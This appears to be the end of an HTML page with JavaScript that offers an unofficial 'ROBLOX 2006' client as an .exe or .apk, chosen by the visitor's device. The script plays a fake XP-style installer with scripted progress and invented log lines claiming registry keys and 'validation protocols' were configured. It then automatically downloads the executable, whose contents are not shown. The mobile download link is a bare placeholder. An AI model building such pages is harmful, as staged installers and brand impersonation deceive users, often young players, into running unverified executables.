        <button id="action-btn" class="dl-btn" onclick="iniciarJanelaInstalador()">Download Now</button>
    </div>
</div>

<!-- JANELA DO ASSISTENTE DE INSTALAÇÃO (WINDOWS XP STYLE) -->
<div id="installer-screen" class="installer-overlay">
    <div class="installer-window">
        <div class="installer-title">
            <span>ROBLOX Setup Wizard</span>
            <span style="cursor:default;">X</span>
        </div>
        
        <p style="margin: 5px 0;"><strong>Installing:</strong> ROBLOX Sandbox Client v1.0.2006</p>
        <p id="installer-current-action" style="color: #444; margin: 5px 0;">Extracting setup resources...</p>
        
        <div class="progress-container">
            <div id="setup-progress" class="progress-bar"></div>
        </div>
        
        <div id="setup-logs" class="installer-logs">Initializing CaBlox system hooks...</div>
    </div>
</div>

<script>
let nomeDoSetupParaBaixar = "RobloxPlayer2006PC.exe";
let nomeDoAppFinal = "RobloxPlayer2006.exe";
let URL_DO_APK_REAL = "_Roblox_2006_19817695.apk"; 
let isMobile = false;

// Detector CaBlox AI V1.08 integrado para descobrir o arquivo correto
function detectarAparelhoEConfigurar() {
    const ua = navigator.userAgent;

    if (/Mobi|Android|iPhone|iPad|Tablet/i.test(ua)) {
        isMobile = true;
        nomeDoSetupParaBaixar = "_Roblox_2006_19817695.apk";
        nomeDoAppFinal = "_Roblox_2006_19817695.apk";
        
        // CORRIGIDO: LINK PÚBLICO DA SUA PAGES
        URL_DO_APK_REAL = "https://github.io";
        
    } else {
        isMobile = false;
        nomeDoSetupParaBaixar = "RobloxPlayer2006PC.exe";
        nomeDoAppFinal = "RobloxPlayer2006.exe";
        URL_DO_APK_REAL = "RobloxPlayer2006.exe";
    }

    verificarEstadoDoApp();
}

function verificarEstadoDoApp() {
    const foiInstalado = localStorage.getItem('roblox_2006_installed') === 'true';
    const titulo = document.getElementById('install-title');
    const desc = document.getElementById('install-desc');
    const status = document.getElementById('app-status');
    const botao = document.getElementById('action-btn');

    if (foiInstalado) {
        titulo.innerText = "ROBLOX Client Up to Date";
        desc.innerHTML = `The 2006 legacy sandbox client (${nomeDoAppFinal}) is already successfully configured on your machine.`;
        status.innerHTML = `App Status: <span style="color: green;">✔ Installed (${isMobile ? 'Mobile App' : 'PC App'})</span>`;

        botao.innerText = "Check for Updates";
        botao.className = "update-btn";
        botao.setAttribute("onclick", "buscarUpdates()");
    } else {
        titulo.innerText = `Install ROBLOX for ${isMobile ? 'Mobile' : 'PC'}`;
        status.innerHTML = `App Status: <span style="color: red;">⚠ Download Recommended: (${nomeDoSetupParaBaixar})</span>`;
        botao.innerText = "Download Now";
        botao.className = "dl-btn";
        botao.setAttribute("onclick", "iniciarJanelaInstalador()");
    }
}

// DISPARA O EXECUTÁVEL DE CARREGAMENTO DIRETO NO SITE
function iniciarJanelaInstalador() {
    alert(`Baixando o assistente inicial: ${nomeDoSetupParaBaixar}. Aguarde a execução automática.`);

    // Abre a tela do instalador Windows XP style
    const telaInstalador = document.getElementById('installer-screen');
    telaInstalador.style.display = "flex";

    const barra = document.getElementById('setup-progress');
    const textoAcao = document.getElementById('installer-current-action');
    const logsBox = document.getElementById('setup-logs');

    let progresso = 0;
    logsBox.innerHTML = `[START] Executing ${nomeDoSetupParaBaixar}...`;

    // Linhas de log que vão aparecendo conforme a instalação avança
    const passosDoInstalador = [
        { p: 15, txt: "Unpacking main game assets...", log: "<br>[INFO] Extracting maps: Chaos Canyon, Crossroads..." },
        { p: 40, txt: "Configuring graphics sandbox layers...", log: "<br>[RENDER] Setting up GDI+ rendering pipelines..." },
        { p: 65, txt: "Injecting CaBlox AI client validation protocols...", log: "<br>[SECURITY] Storage sandbox linked into system." },
        { p: 85, txt: "Creating desktop and application shortcuts...", log: "<br>[LINK] Executable routes pointing to play.html" },
        { p: 100, txt: "Installation complete! Packaging final client...", log: "<br>[SUCCESS] Core registry keys configured successfully." }
    ];

    // Intervalo que faz a barra encher simulando a instalação real
    const intervaloInstalacao = setInterval(() => {
        progresso += 2;
        barra.style.width = progresso + "%";

        // Checa se bateu em algum passo de log para atualizar o texto da tela
        passosDoInstalador.forEach(passo => {
            if (progresso === passo.p) {
                textoAcao.innerText = passo.txt;
                logsBox.innerHTML += passo.log;
                logsBox.scrollTop = logsBox.scrollHeight;
            }
        });

        if (progresso >= 100) {
            clearInterval(intervaloInstalacao);

            setTimeout(() => {
                // Fecha o instalador de carregamento
                telaInstalador.style.display = "none";

                // DISPARA O DOWNLOAD AUTOMÁTICO DO SEU APK REAL
                alert(`Instalação Concluída! Baixando agora o arquivo final: ${nomeDoAppFinal}`);
                dispararDownloadFisico(URL_DO_APK_REAL, nomeDoAppFinal);

                // Salva o estado no localStorage do navegador
                localStorage.setItem('roblox_2006_installed', 'true');
                detectarAparelhoEConfigurar();
            }, 800);
        }
    }, 80); // Velocidade do carregamento
}

// BUSCA O ARQUIVO DIRETO NO LINK CORRETO DO SEU SITE
function dispararDownloadFisico(urlArquivo, nomeVisivel) {
    const link = document.createElement('a');
    link.href = urlArquivo; 
    link.download = nomeVisivel; 
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

function buscarUpdates() {
    alert('Buscando patches de otimização nos servidores da CaBlox AI...');
    alert('Seu aplicativo já está sincronizado na build mais estável e recente (v1.0.2006)!');
}

// Roda os rastreadores assim que a janela carrega
window.onload = detectarAparelhoEConfigurar;
</script>
</body>
</html>
